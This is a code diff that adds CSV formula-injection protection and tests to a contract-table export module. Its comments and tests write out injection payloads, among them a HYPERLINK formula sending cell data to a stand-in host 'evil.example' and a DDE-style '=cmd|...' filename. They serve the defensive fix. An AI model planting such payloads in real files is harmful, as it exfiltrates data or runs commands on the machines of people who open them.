@@ -294,20 +294,46 @@ class Table:
                    for d in self.document_ids for c in self.columns)
 
 
+# Characters that make a spreadsheet treat a cell as a FORMULA rather than text. A contract
+# clause beginning "=" is unusual; a crafted one is not, and the attack is ordinary: a
+# document whose text begins `=HYPERLINK("http://x/?"&A1,"click")` exports into a CSV that
+# exfiltrates the row when a lawyer opens it in Excel. Tab and carriage return are here
+# because they can break a value across cells and smuggle a leading `=` into the next one.
+_FORMULA_LEAD = ("=", "+", "-", "@", "\t", "\r")
+CSV_GUARD = "'"
+
+
+def csv_safe(value: str) -> str:
+    """One leading quote on anything a spreadsheet would run. Only for EXPORT.
+
+    The stored cell is never changed: `Cell.value` is what the document says, and editing
+    it to suit a spreadsheet would make the quote in the next column disagree with the
+    value beside it. This is a rendering rule and it lives at the boundary.
+
+    The cost is real and accepted: a negative amount exports as `'-50000` and shows as text
+    in Excel. A number that reads oddly is better than an export that runs.
+    """
+    v = "" if value is None else str(value)
+    return CSV_GUARD + v if v.startswith(_FORMULA_LEAD) else v
+
+
 def to_csv(table: Table, *, names: dict | None = None) -> str:
-    """The table as CSV. Every cell is non-empty, including the ones that found nothing.
+    """The table as CSV. Every cell is non-empty, and none of them can run as a formula.
 
     `names` maps document_id -> a human name. A sha256 down the first column is accurate
     and unreadable, and a lawyer exporting this is going to send it to someone.
+
+    **The document name is guarded too**, not just the cells: a file called
+    `=cmd|'/c calc'!A1.docx` is a filename, and it lands in column one.
     """
     names = names or {}
     buf = io.StringIO()
     w = csv.writer(buf, lineterminator="\n")
-    w.writerow(["document"] + [c.name for c in table.columns])
+    w.writerow(["document"] + [csv_safe(c.name) for c in table.columns])
     for d in table.document_ids:
-        row = [names.get(d) or d]
+        row = [csv_safe(names.get(d) or d)]
         for col in table.columns:
-            row.append(table.cell(d, col.name).rendered)
+            row.append(csv_safe(table.cell(d, col.name).rendered))
         w.writerow(row)
     return buf.getvalue()
 
@@ -551,6 +577,42 @@ def _test() -> int:
           "the CSV distinguishes a transport failure from a document that lacks the clause")
     empt = [v for r in csv.reader(io.StringIO(out2)) for v in r if not str(v).strip()]
     check(not empt, f"...and still no cell is empty ({empt})")
+
+    # ── CSV injection: nothing exported can run as a formula ────────────────
+    for raw in ("=HYPERLINK(\"http://x\",\"click\")", "+1+1", "-50000", "@SUM(A1)",
+                "\tleading tab", "\rleading cr"):
+        guarded = csv_safe(raw)
+        check(guarded.startswith(CSV_GUARD) and guarded[1:] == raw,
+              f"{raw[:22]!r} is prefixed with a single quote and otherwise unchanged")
+    for ordinary in ("India", "2029-03-31", "INR 50,00,000", "yes", "NOT FOUND", ""):
+        check(csv_safe(ordinary) == ordinary,
+              f"{ordinary!r} is left exactly as it is -- the guard is not a general escape")
+
+    EVIL = ("MUTUAL NDA\n"
+            "=HYPERLINK(\"http://evil.example/?\"&A1,\"click me\") is the governing law "
+            "clause.\n")
+    EV = Column("governing law", TEXT, "Which law governs?")
+    evil_cell = found(document_id="d9", column=EV,
+                      value="=HYPERLINK(\"http://evil.example/?\"&A1,\"click me\")",
+                      quote="=HYPERLINK(\"http://evil.example/?\"&A1,\"click me\")",
+                      document_text=EVIL)
+    check(evil_cell.value.startswith("="),
+          "the STORED cell keeps the document's words verbatim, formula-looking and all -- "
+          "editing it would make the quote disagree with the value beside it")
+    ev_csv = to_csv(Table("t9", "n", (EV,), ("d9",), (evil_cell,)))
+    cells9 = [r for r in csv.reader(io.StringIO(ev_csv))][1]
+    check(cells9[1].startswith(CSV_GUARD),
+          f"...while the EXPORT prefixes it, so Excel shows text and runs nothing "
+          f"({cells9[1][:26]!r})")
+    check(not any(v.startswith(("=", "+", "@")) for r in csv.reader(io.StringIO(ev_csv))
+                  for v in r),
+          "no exported value begins with a formula lead, in any row")
+    nasty = to_csv(Table("t9", "n", (EV,), ("d9",), (evil_cell,)),
+                   names={"d9": "=cmd|'/c calc'!A1.docx"})
+    first = [r for r in csv.reader(io.StringIO(nasty))][1][0]
+    check(first.startswith(CSV_GUARD),
+          f"the document NAME is guarded too -- a filename lands in column one "
+          f"({first[:22]!r})")
 
     # ── Wilson ──────────────────────────────────────────────────────────────
     lo, hi = wilson(2, 2)
